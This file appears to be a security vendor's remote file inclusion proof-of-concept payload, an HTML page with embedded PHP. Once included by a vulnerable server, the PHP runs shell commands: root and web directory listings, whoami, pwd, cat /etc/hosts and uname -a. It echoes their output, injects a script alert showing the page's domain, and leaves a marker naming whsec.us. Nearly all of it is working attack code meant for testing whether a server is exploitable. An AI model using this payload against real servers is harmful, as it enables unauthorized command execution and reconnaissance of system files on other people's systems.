<html>
<body>
<h1 id="header">WhiteHat Security Remote File Include Proof of Concept</h1>
<!-- Comment out the PHP code should the code not be executed server side.
<?php
    $ls_output = `ls -alG /`;
    $ls0_output = `ls /var/www/html/rfi1/`;
    $ls1_output = `ls /var/www/html/rfi2/`;
    $ls_output = `ls -alG /`;
    $whoami_output = `whoami`;
    $pwd_output = `pwd`;
    $catetchosts_output = `cat /etc/hosts`;
    $uname_a = `uname -a`;
    ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
    ECHO "<div><ol><li>Root file directory listing (\"ls -alG /\")</li>";
    ECHO "<li>Who Am I: (\"whoami\")</li>";
    ECHO "<li>Present Working Directory: (\"pwd\")</li>";
    ECHO "<li>Display contents of /etc/hosts: (\"cat /etc/hosts\")</li>";
    ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
    ECHO "<b><dl><dt>\"ls\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
    ECHO "<dt><b>Who Am I?</b></dt>"; 
    ECHO "<dd>".$whoami_output. "</dd>";
    ECHO "<b><dt>Present Working Directory:</dt></b>";
    ECHO "<dd>".$pwd_output."</dd>";
    

    ECHO "<script>alert(\"Client Side Script Execution: \" + document.domain );var run = true</script><!--"
?>
-->
<script>
var run;
if( !run ){ 
  alert("This file executes only client side on: " + document.domain )
  var header = document.getElementById('header')
  var message = document.createElement('p')
  message.textContent = "This file writes html and javascript to the page client side"
  header.appendChild( message )

}
</script>
<input type="hidden' value='oreniX - RFI check code ran on server: whsec.us'></input>
</body>
</html>
